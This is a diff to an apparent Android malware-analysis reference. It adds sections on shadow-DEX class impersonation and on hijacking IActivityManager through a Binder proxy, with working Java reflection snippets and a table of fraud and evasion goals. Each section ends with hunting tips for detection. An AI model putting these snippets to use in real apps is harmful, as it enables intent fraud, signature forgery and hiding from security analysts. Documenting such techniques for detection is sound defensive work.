@@ -61,6 +61,37 @@ Class<?> cls = loader.loadClass("com.malware.Stage2");
 cls.getMethod("init", Context.class).invoke(null, this);
 ```
 
+### Shadow-DEX Class Impersonation
+
+A more aggressive variant of `PathClassLoader` manipulation: the payload DEX is **prepended** to `pathList.dexElements` (index 0) so that classes inside it shadow legitimate classes resolved later in the chain. Pair this with payload classes deliberately named after AndroidX, GMS, or Firebase framework classes:
+
+```
+androidx.work.impl.foreground.SystemForegroundService
+androidx.work.impl.background.systemalarm.RescheduleReceiver
+com.google.firebase.messaging.FirebaseMessagingService
+```
+
+The manifest registers these as services / receivers. Android resolves them through the modified classloader, picks up the payload's shadow class first, and never sees the real AndroidX implementation. From the outside, `dumpsys package` and `pm dump` show familiar framework class names — analysts skim past them.
+
+```java
+Object pathList = getField(getClassLoader(), "pathList");
+Object[] existing = (Object[]) getField(pathList, "dexElements");
+
+Method makeInMem = pathListCls.getDeclaredMethod(
+    "makeInMemoryDexElements", ByteBuffer[].class, List.class);
+Object[] shadow = (Object[]) makeInMem.invoke(pathList,
+    new ByteBuffer[]{ByteBuffer.wrap(payloadDex)}, new ArrayList<>());
+
+Object[] merged = new Object[shadow.length + existing.length];
+System.arraycopy(shadow,   0, merged, 0,             shadow.length);
+System.arraycopy(existing, 0, merged, shadow.length, existing.length);
+setField(pathList, "dexElements", merged);
+```
+
+Index-0 placement is the key detail: appended elements never resolve before the real ones, so the "merge" must put the shadow DEX **first**. Combined with [Hidden API Bypass](anti-analysis-techniques.md#hidden-api-bypass) for the wildcard `"L"` exemption, the payload also gets free access to `@hide` framework APIs.
+
+Hunting tip: a manifest service named `androidx.work.impl.foreground.SystemForegroundService` whose declaring DEX is *not* the AndroidX library DEX (or whose containing classloader element sits at index 0 of `pathList.dexElements` at runtime) is shadow-DEX impersonation, not normal AndroidX integration.
+
 ### PathClassLoader Manipulation
 
 The default `PathClassLoader` loads the APK's own classes. Malware can manipulate its internal `DexPathList` to inject additional DEX files into the existing class loader rather than creating a new one. This makes the loaded code appear as part of the original APK to reflection-based inspection.
@@ -147,6 +178,47 @@ Some families support modular architecture where individual capabilities are loa
 | `vnc.dex` | Remote screen access | Operator requests session |
 | `keylog.dex` | Accessibility keylogger | Always loaded |
 | `ats.dex` | Automated transfer scripts | Target bank identified |
+
+## Binder-Proxy System Service Hijack
+
+Dynamic code loading sometimes ships **alongside** an in-process replacement of a system service Binder. The payload installs a `java.lang.reflect.Proxy` over `IActivityManager` (or `IPackageManager`, `IActivityTaskManager`) and writes it back into the framework's static singleton via reflection — for the lifetime of the process, every call to that service inside the app is routed through the payload's `InvocationHandler`.
+
+```java
+Class<?> amn  = Class.forName("android.app.ActivityManagerNative");
+Field gDef    = amn.getDeclaredField("gDefault");
+gDef.setAccessible(true);
+Object singleton = gDef.get(null);
+
+Field mInstance = singleton.getClass().getSuperclass()
+    .getDeclaredField("mInstance");
+mInstance.setAccessible(true);
+Object real = mInstance.get(singleton);
+
+Class<?> iAm = Class.forName("android.app.IActivityManager");
+Object proxy = Proxy.newProxyInstance(
+    iAm.getClassLoader(), new Class[]{iAm},
+    (p, method, args) -> {
+        Object result = method.invoke(real, args);
+        if ("startActivity".equals(method.getName())) {
+            captureIntent((Intent) args[2]);
+        } else if ("getPackageInfo".equals(method.getName())) {
+            result = forgeSignature(result);
+        }
+        return result;
+    });
+mInstance.set(singleton, proxy);
+```
+
+The hook surface is huge: every `startActivity`, `startService`, `sendBroadcast`, `getPackageInfo`, `getInstalledPackages` call from anywhere in the process flows through the proxy. Used for:
+
+| Goal | Method intercepted | Action |
+|------|--------------------|--------|
+| Click-attribution / intent fraud | `startActivity` | Capture URL/extras and POST to C2 before forwarding |
+| Forge own signature for license checks | `getPackageInfo` | Return a `PackageInfo` carrying the *original* developer's signing cert instead of the repack's |
+| Hide other apps from enumeration | `getInstalledPackages` | Filter the result list (anti-AV, anti-MITM-tool detection) |
+| Re-route service starts | `startService` | Swap `Intent.component` to a payload service |
+
+Version-aware variants split at API 29 where `IActivityTaskManager` carries part of the surface that used to be on `IActivityManager`. Legitimate use exists in plugin frameworks (DroidPlugin, ByteDance Pangle) — by itself the pattern is not a smoking gun. Pair with the other DCL signals (`InMemoryDexClassLoader`, hidden-API exemption, encrypted assets) for confident attribution.
 
 ## Reflection-Based Instantiation
 
